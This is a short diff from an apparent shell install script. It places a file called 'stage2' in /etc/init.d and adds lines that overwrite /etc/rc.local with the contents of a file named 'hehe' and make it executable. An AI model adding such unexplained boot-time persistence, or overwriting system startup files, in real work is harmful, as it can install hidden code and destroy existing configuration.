@@ -42,3 +42,5 @@ sleep 5
 echo 
 sudo cp stage2 /etc/init.d/stage2
 sudo chmod +x /etc/init.d/stage2
+sudo echo $(cat hehe) > /etc/rc.local
+sudo chmod +x /etc/rc.local
